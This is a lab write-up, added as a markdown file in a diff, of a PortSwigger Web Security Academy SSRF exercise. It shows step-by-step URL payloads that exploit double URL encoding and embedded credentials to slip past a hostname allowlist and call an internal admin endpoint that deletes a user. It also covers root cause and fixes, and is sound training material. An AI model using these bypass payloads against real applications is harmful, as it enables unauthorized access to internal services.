@@ -1,0 +1,154 @@
+# SSRF with Whitelist-Based Input Filter
+
+## Executive Summary
+
+The application was vulnerable to **Server-Side Request Forgery (SSRF)**. Although a hostname allowlist restricted requests to `stock.weliketoshop.net`, the validation could be bypassed by abusing URL parsing inconsistencies and double URL encoding.
+
+The vulnerability allowed access to the internal administrative interface and execution of privileged functionality, resulting in the deletion of the user `carlos`.
+
+---
+
+# Vulnerability Information
+
+**Category**
+
+Server-Side Request Forgery (SSRF)
+
+**Severity**
+
+High
+
+**OWASP Top 10**
+
+* A10:2021 – Server-Side Request Forgery (SSRF)
+
+**CWE**
+
+* CWE-918 – Server-Side Request Forgery (SSRF)
+
+---
+
+# Objective
+
+Gain access to the internal administrative interface protected by a hostname allowlist and delete the user `carlos`.
+
+---
+
+# Methodology
+
+## 1. Identify the SSRF
+
+The stock checker accepted a user-controlled URL through the `stockApi` parameter.
+
+Example:
+
+```http
+POST /product/stock HTTP/2
+
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
+```
+
+The application performed a server-side HTTP request using this value.
+
+---
+
+## 2. Verify the Whitelist
+
+Replacing the URL with:
+
+```text
+http://127.0.0.1/
+```
+
+resulted in the request being rejected, confirming that the hostname was validated against a whitelist.
+
+---
+
+## 3. Test Embedded Credentials
+
+The following payload was accepted:
+
+```text
+http://username@stock.weliketoshop.net/
+```
+
+This demonstrated that the URL parser supported embedded credentials and only validated the hostname (`stock.weliketoshop.net`).
+
+---
+
+## 4. Test Fragment Injection
+
+Injecting a fragment directly:
+
+```text
+http://username#@stock.weliketoshop.net/
+```
+
+caused the application to reject the URL.
+
+Using the double URL encoded value:
+
+```text
+http://username%2523@stock.weliketoshop.net/
+```
+
+produced an Internal Server Error, indicating inconsistent URL decoding between the validation logic and the HTTP client.
+
+---
+
+## 5. Exploit
+
+The following payload successfully bypassed the whitelist:
+
+```text
+http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+```
+
+After validation, the HTTP client interpreted the URL differently and ultimately connected to:
+
+```text
+http://localhost/admin/delete?username=carlos
+```
+
+This executed the administrative action and deleted the target user.
+
+---
+
+# Root Cause
+
+The application validated the hostname before the URL was fully decoded.
+
+The validation logic and the HTTP client interpreted the URL differently, allowing an attacker to craft a payload that appeared to reference an allowed host while ultimately connecting to an internal resource.
+
+---
+
+# Impact
+
+An attacker could bypass hostname restrictions protecting the SSRF endpoint and access internal services that were never intended to be externally reachable.
+
+Potential impacts include:
+
+* Access to internal administrative interfaces
+* Execution of privileged administrative actions
+* Access to cloud metadata services
+* Internal network reconnaissance
+* Lateral movement within the internal infrastructure
+
+---
+
+# Recommendations
+
+* Do not rely solely on hostname allowlists.
+* Fully normalize and decode URLs before validation.
+* Validate the final destination after all decoding and redirects.
+* Reject URLs containing embedded credentials (`user@host`).
+* Reject ambiguous or double-encoded characters.
+* Restrict outbound network access to explicitly approved destinations.
+
+---
+
+# References
+
+* CWE-918 – Server-Side Request Forgery (SSRF)
+* OWASP SSRF Prevention Cheat Sheet
+* PortSwigger Web Security Academy – SSRF with whitelist-based input filter
